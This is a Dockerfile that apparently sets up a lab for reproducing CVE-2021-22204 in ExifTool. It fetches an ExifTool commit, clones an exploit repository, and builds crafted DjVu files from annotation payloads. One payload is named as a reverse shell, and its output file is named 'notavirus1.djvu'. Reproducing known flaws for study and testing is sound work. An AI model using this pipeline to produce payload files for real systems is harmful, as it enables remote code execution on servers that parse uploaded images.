FROM alpine

EXPOSE 4242

WORKDIR /tmp

RUN apk update &&\
    apk add --no-cache \
	git \
	wget \
	make \
	djvulibre

RUN apk add perl 

RUN wget https://salsa.debian.org/perl-team/modules/packages/libimage-exiftool-perl/-/archive/c52a38258c2496c7e2bcb27ed4cd93e5e4c7a9ae/libimage-exiftool-perl-c52a38258c2496c7e2bcb27ed4cd93e5e4c7a9ae.tar.gz \
	&& tar -xf *.gz \
	&& cd *exiftool*/\
	&& perl \
	&& perl Makefile.PL\
	&& make\
	&& make test\
	&& make install\
	&& git clone https://github.com/Asaad27/CVE-2021-22204-RSE.git \
	&& mv CVE-2021-22204-RSE/*.djvu /tmp \
	&& mv CVE-2021-22204-RSE/*.dsed /tmp \
	&& mv exiftool /tmp 

RUN rm -rf *.gz\
	&& rm -rf libimage*

COPY . /tmp

RUN djvumake notavirus1.djvu INFO=0,0 BGjp=/dev/null ANTa=reverseshell.dsed\
	&& djvumake notavirus2.djvu INFO=0,0 BGjp=/dev/null ANTa=testshellcommand.dsed\
	&& djvumake test.djvu INFO=0,0 BGjp=/dev/null ANTa=test.dsed
